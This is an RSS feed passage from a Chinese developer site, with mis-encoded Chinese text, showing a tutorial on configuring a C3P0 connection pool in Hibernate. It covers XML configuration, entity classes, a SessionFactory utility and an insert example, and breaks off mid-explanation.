<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FPGxwhRbuiRUKIpT2D2cVGQ" target="_blank" title="https://mp.weixin.qq.com/s/PGxwhRbuiRUKIpT2D2cVGQ" ref="nofollow noopener noreferrer">GDAL å®ç°çŸ¢é‡æ•°æ®è¯»å†™</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2Fi77nCatd4V2nuybZFIs-xA" target="_blank" title="https://mp.weixin.qq.com/s/i77nCatd4V2nuybZFIs-xA" ref="nofollow noopener noreferrer">GDAL æ•°æ®ç±»å‹å¤§å…¨</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F0DGoC0oFHizJbweBnEvI-g" target="_blank" title="https://mp.weixin.qq.com/s/0DGoC0oFHizJbweBnEvI-g" ref="nofollow noopener noreferrer">GDAL å®ç° GIS æ•°æ®è¯»å–è½¬æ¢ï¼ˆå…¨ï¼‰</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernateï¼ˆ29ï¼‰ä»€ä¹ˆæ˜¯Hibernateçš„è¿æ¥æ± ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7592865044690829318</link>    <guid>https://juejin.cn/post/7592865044690829318</guid>    <pubDate>2026-01-08T12:14:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592865044690829318" data-draft-id="7592856733182574628" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernateï¼ˆ29ï¼‰ä»€ä¹ˆæ˜¯Hibernateçš„è¿æ¥æ± ï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-08T12:14:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernateï¼ˆ29ï¼‰ä»€ä¹ˆæ˜¯Hibernateçš„è¿æ¥æ± ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T12:14:49.000Z" title="Thu Jan 08 2026 12:14:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">Hibernateçš„è¿æ¥æ± </h3>
<p>åœ¨æ•°æ®åº“åº”ç”¨ç¨‹åºä¸­ï¼Œè¿æ¥æ± ï¼ˆConnection Poolï¼‰æ˜¯æŒ‡ä¸€ç»„é¢„å…ˆå»ºç«‹çš„æ•°æ®åº“è¿æ¥ï¼Œä»¥ä¾›åº”ç”¨ç¨‹åºé‡å¤ä½¿ç”¨ã€‚è¿æ¥æ± å¯ä»¥æ˜¾è‘—æé«˜åº”ç”¨ç¨‹åºçš„æ€§èƒ½ï¼Œå› ä¸ºåˆ›å»ºå’Œå…³é—­æ•°æ®åº“è¿æ¥æ˜¯éå¸¸è€—æ—¶çš„æ“ä½œã€‚é€šè¿‡ä½¿ç”¨è¿æ¥æ± ï¼Œå¯ä»¥å‡å°‘è¿æ¥çš„åˆ›å»ºå’Œå…³é—­æ¬¡æ•°ï¼Œä»è€Œæé«˜æ•ˆç‡ã€‚</p>
<p>Hibernateå¯ä»¥ä¸å¤šç§è¿æ¥æ± å®ç°é›†æˆï¼ŒåŒ…æ‹¬C3P0ã€Apache DBCPã€HikariCPç­‰ã€‚æ¯ç§è¿æ¥æ± éƒ½æœ‰å…¶ç‰¹å®šçš„é…ç½®å‚æ•°ã€‚</p>
<h3 data-id="heading-1">ä½¿ç”¨Hibernateé…ç½®è¿æ¥æ± </h3>
<p>ä¸‹é¢å°†è¯¦ç»†ä»‹ç»å¦‚ä½•åœ¨Hibernateä¸­é…ç½®C3P0è¿æ¥æ± ã€‚</p>
<h3 data-id="heading-2">ç¤ºä¾‹ä»£ç </h3>
<h4 data-id="heading-3">é…ç½®æ–‡ä»¶ <code>hibernate.cfg.xml</code></h4>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">hibernate-configuration</span> <span class="hljs-keyword">PUBLIC</span>
        <span class="hljs-string">"-//Hibernate/Hibernate Configuration DTD 3.0//EN"</span>
        <span class="hljs-string">"http://hibernate.sourceforge.net/hibernate-configuration-3.0.dtd"</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">hibernate-configuration</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">session-factory</span>&gt;</span>
        <span class="hljs-comment">&lt;!-- æ•°æ®åº“è¿æ¥é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/your_database<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>your_username<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>your_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- Hibernate å±æ€§é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.format_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.hbm2ddl.auto"</span>&gt;</span>update<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- C3P0 è¿æ¥æ± é…ç½® --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.c3p0.min_size"</span>&gt;</span>5<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.c3p0.max_size"</span>&gt;</span>20<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.c3p0.timeout"</span>&gt;</span>300<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.c3p0.max_statements"</span>&gt;</span>50<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.c3p0.idle_test_period"</span>&gt;</span>3000<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

        <span class="hljs-comment">&lt;!-- æ˜ å°„ç±» --&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Person"</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">mapping</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"com.example.domain.Address"</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">session-factory</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">hibernate-configuration</span>&gt;</span>
</code></pre>
<h3 data-id="heading-4">å®ä½“ç±»ç¤ºä¾‹</h3>
<p>ä»¥<code>Person</code>å’Œ<code>Address</code>ä¸ºä¾‹ï¼Œè¿™äº›ç±»ä¸ä¹‹å‰çš„ç¤ºä¾‹ç›¸åŒã€‚</p>
<h4 data-id="heading-5">Personç±»</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.domain;

<span class="hljs-keyword">import</span> javax.persistence.*;
<span class="hljs-keyword">import</span> java.util.HashSet;
<span class="hljs-keyword">import</span> java.util.Set;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "person")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> {

    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;

    <span class="hljs-meta">@Column(name = "name")</span>
    <span class="hljs-keyword">private</span> String name;

    <span class="hljs-meta">@Column(name = "age")</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;

    <span class="hljs-meta">@OneToMany(mappedBy = "person", fetch = FetchType.LAZY, cascade = CascadeType.ALL)</span>
    <span class="hljs-keyword">private</span> Set&lt;Address&gt; addresses = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> {}

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> {
        <span class="hljs-built_in">this</span>.name = name;
        <span class="hljs-built_in">this</span>.age = age;
    }

    <span class="hljs-comment">// Getters å’Œ Setters</span>

    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> id;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-built_in">this</span>.id = id;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> {
        <span class="hljs-built_in">this</span>.name = name;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> age;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> {
        <span class="hljs-built_in">this</span>.age = age;
    }

    <span class="hljs-keyword">public</span> Set&lt;Address&gt; <span class="hljs-title function_">getAddresses</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> addresses;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAddresses</span><span class="hljs-params">(Set&lt;Address&gt; addresses)</span> {
        <span class="hljs-built_in">this</span>.addresses = addresses;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addAddress</span><span class="hljs-params">(Address address)</span> {
        addresses.add(address);
        address.setPerson(<span class="hljs-built_in">this</span>);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">removeAddress</span><span class="hljs-params">(Address address)</span> {
        addresses.remove(address);
        address.setPerson(<span class="hljs-literal">null</span>);
    }
}
</code></pre>
<h4 data-id="heading-6">Addressç±»</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.domain;

<span class="hljs-keyword">import</span> javax.persistence.*;

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "address")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Address</span> {

    <span class="hljs-meta">@Id</span>
    <span class="hljs-meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span>
    <span class="hljs-keyword">private</span> Long id;

    <span class="hljs-meta">@Column(name = "street")</span>
    <span class="hljs-keyword">private</span> String street;

    <span class="hljs-meta">@ManyToOne</span>
    <span class="hljs-meta">@JoinColumn(name = "person_id", nullable = false)</span>
    <span class="hljs-keyword">private</span> Person person;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Address</span><span class="hljs-params">()</span> {}

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Address</span><span class="hljs-params">(String street, Person person)</span> {
        <span class="hljs-built_in">this</span>.street = street;
        <span class="hljs-built_in">this</span>.person = person;
    }

    <span class="hljs-comment">// Getters å’Œ Setters</span>

    <span class="hljs-keyword">public</span> Long <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> id;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(Long id)</span> {
        <span class="hljs-built_in">this</span>.id = id;
    }

    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getStreet</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> street;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setStreet</span><span class="hljs-params">(String street)</span> {
        <span class="hljs-built_in">this</span>.street = street;
    }

    <span class="hljs-keyword">public</span> Person <span class="hljs-title function_">getPerson</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> person;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPerson</span><span class="hljs-params">(Person person)</span> {
        <span class="hljs-built_in">this</span>.person = person;
    }
}
</code></pre>
<h4 data-id="heading-7">HibernateUtilç±»</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateUtil</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// ä»é…ç½®æ–‡ä»¶åˆ›å»ºSessionFactory</span>
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            <span class="hljs-comment">// è®°å½•å¯åŠ¨å¤±è´¥çš„é”™è¯¯</span>
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> SessionFactory <span class="hljs-title function_">getSessionFactory</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> sessionFactory;
    }
}
</code></pre>
<h3 data-id="heading-8">ä½¿ç”¨è¿æ¥æ± çš„ç¤ºä¾‹</h3>
<h4 data-id="heading-9">æ’å…¥æ•°æ®ç¤ºä¾‹</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.Transaction;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateConnectionPoolExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// è·å–SessionFactory</span>
        <span class="hljs-type">SessionFactory</span> <span class="hljs-variable">sessionFactory</span> <span class="hljs-operator">=</span> HibernateUtil.getSessionFactory();

        <span class="hljs-comment">// æ’å…¥æ•°æ®</span>
        insertSampleData(sessionFactory);

        <span class="hljs-comment">// å…³é—­SessionFactory</span>
        sessionFactory.close();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insertSampleData</span><span class="hljs-params">(SessionFactory sessionFactory)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-type">Transaction</span> <span class="hljs-variable">transaction</span> <span class="hljs-operator">=</span> session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">"John Doe"</span>, <span class="hljs-number">30</span>);
            <span class="hljs-type">Address</span> <span class="hljs-variable">address1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Address</span>(<span class="hljs-string">"123 Street"</span>, person);
            <span class="hljs-type">Address</span> <span class="hljs-variable">address2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Address</span>(<span class="hljs-string">"456 Avenue"</span>, person);

            person.addAddress(address1);
            person.addAddress(address2);

            <span class="hljs-comment">// ä¿å­˜Personå¯¹è±¡æ—¶ï¼Œçº§è”ä¿å­˜Addresså¯¹è±¡</span>
            session.save(person);
            transaction.commit();
            System.out.println(<span class="hljs-string">"Inserted Person with Addresses"</span>);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            <span class="hljs-keyword">if</span> (transaction != <span class="hljs-literal">null</span>) {
                transaction.rollback();
            }
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-keyword">if</span> (session != <span class="hljs-literal">null</span>) {
                session.close();
            }
        }
    }
}
</code></pre>
<h3 data-id="heading-10">è¿æ¥æ± é…ç½®è¯¦ç»†è§£é‡Š</h3>
<ol>
<li>
<p><strong>é…ç½®æ–‡ä»¶ <code>hibernate.cfg.xml</code></strong>ï¼šå®šä¹‰æ•°æ®åº“è¿æ¥ä¿¡æ¯ã€Hibernateå±æ€§é…ç½®ä»¥åŠå®ä½“ç±»æ˜ å°„é…ç½®ã€‚</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.driver_class"</span>&gt;</span>com.mysql.cj.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.url"</span>&gt;</span>jdbc:mysql://localhost:3306/your_database<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.username"</span>&gt;</span>your_username<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.connection.password"</span>&gt;</span>your_password<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.dialect"</span>&gt;</span>org.hibernate.dialect.MySQLDialect<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.show_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.format_sql"</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.hbm2ddl.auto"</span>&gt;</span>update<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>

<span class="hljs-comment">&lt;!-- C3P0 è¿æ¥æ± é…ç½® --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.c3p0.min_size"</span>&gt;</span>5<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.c3p0.max_size"</span>&gt;</span>20<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.c3p0.timeout"</span>&gt;</span>300<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.c3p0.max_statements"</span>&gt;</span>50<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"hibernate.c3p0.idle_test_period"</span>&gt;</span>3000<span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span>
</code></pre>
</li>
<li>
<p><strong>å®ä½“ç±» <code>Person</code> å’Œ <code>Address</code></strong>ï¼šå®šä¹‰å®ä½“ç±»åŠå…¶å±æ€§ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "person")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> {
    <span class="hljs-comment">// å±æ€§å’Œæ–¹æ³•</span>
}

<span class="hljs-meta">@Entity</span>
<span class="hljs-meta">@Table(name = "address")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Address</span> {
    <span class="hljs-comment">// å±æ€§å’Œæ–¹æ³•</span>
}
</code></pre>
</li>
<li>
<p><strong>HibernateUtilç±»</strong>ï¼šåˆ›å»ºå¹¶ç®¡ç†SessionFactoryã€‚</p>
